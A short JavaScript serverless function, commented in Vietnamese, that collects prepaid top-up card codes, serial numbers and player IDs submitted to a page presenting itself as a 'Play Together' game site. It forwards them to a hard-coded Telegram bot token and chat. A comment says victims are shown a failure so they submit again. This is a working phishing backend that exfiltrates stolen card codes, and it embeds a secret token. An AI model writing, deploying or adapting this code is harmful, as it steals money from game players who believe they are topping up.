const axios = require('axios');

exports.handler = async (event) => {
  // Chỉ cho phép phương thức POST
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  try {
    const { type, code, seri, playerID, amount } = JSON.parse(event.body);

    // Thông tin Bot Telegram của bạn từ ảnh cung cấp
    const TELEGRAM_TOKEN = "8631916029:AAEZ3afReaeehe860KzXKJI5X48d8c2-6cE"; 
    const CHAT_ID = "7833122332";

    const message = `
🔥 **THÔNG BÁO NẠP THẺ MỚI** 🔥
━━━━━━━━━━━━━━━━━━
👤 **ID Player:** \`${playerID}\`
💳 **Loại thẻ:** ${type}
💰 **Mệnh giá:** ${Number(amount).toLocaleString('vi-VN')} VNĐ
📌 **Mã thẻ:** \`${code}\`
🔢 **Số Seri:** \`${seri}\`
━━━━━━━━━━━━━━━━━━
🕒 *Thời gian:* ${new Date().toLocaleString('vi-VN', {timeZone: 'Asia/Ho_Chi_Minh'})}
🌐 *Nguồn:* Website Play Together
    `;

    // Gửi dữ liệu về Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown"
    });

    // Trả về kết quả cho trình duyệt (vẫn báo thất bại trên web để khách nạp lại)
    return {
      statusCode: 200,
      body: JSON.stringify({ status: "success" }),
    };

  } catch (error) {
    console.error('Lỗi gửi Telegram:', error);
    return { 
      statusCode: 500, 
      body: JSON.stringify({ status: "error", message: error.message }) 
    };
  }
};
